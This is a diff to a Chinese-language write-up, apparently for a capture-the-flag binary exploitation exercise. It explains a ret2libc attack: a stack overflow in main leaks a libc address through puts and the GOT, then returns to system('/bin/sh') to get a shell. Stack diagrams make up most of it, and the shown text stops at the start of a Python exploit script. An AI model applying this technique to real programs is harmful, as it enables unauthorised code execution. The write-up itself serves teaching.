@@ -51,6 +51,50 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 *PostScript*: 关于 `PLT` 表与 `GOT` 表的关系可以参考 [LIEF](<https://lief.quarkslab.com/doc/stable/tutorials/05_elf_infect_plt_got.html>)
 
+### `leak_libc_main`
+
+我们将控制 `main` 函数溢出后，其栈帧形成下面的形式：
+
+```
+                   +----------------+                                   
+                   |                |                                   
+              0x64 | local variable |-----> 'A'*0x64                    
+                   |                |                                   
+                   +----------------+                                   
+               0x4 | previous $ebp  |-----> 'A'* 0x4                    
+                   +----------------+                                   
+               0x4 | return address |-----> "puts" address              
+                   +----------------+                                   
+                                    ------> "main" address              
+                                                                        
+                                    ------> .got.plt:"__start_libc_main"
+```
+
+实际上执行的是这样一个函数 `puts("__start_libc_main")`。
+
+### `get_shell`
+
+因为上面的的栈帧控制，我们可以再执行一次 `main` 函数，经过之前的泄露我们可以得到 `libc` 的加载基地址，因此可以得到 `system` 的地址，从而可以执行系统调用拿到 `shell`：
+
+```
+                   +----------------+                        
+                   |                |                        
+              0x64 | local variable ------> 'A'*0x64         
+                   |                |                        
+                   +----------------+                        
+               0x4 | previous $ebp  ------> 'A'* 0x4         
+                   +----------------+                        
+               0x4 | return address ------> "system" address 
+                   +----------------+                        
+                                    ------> 'A'* 0x4         
+                                                             
+                                    ------> "/bin/sh" address
+```
+
+实际上执行的是这样一个函数 `system("/bin/sh")`。
+
+### 脚本
+
 ```python
 #!/usr/bin/env python2
 # coding=utf-8
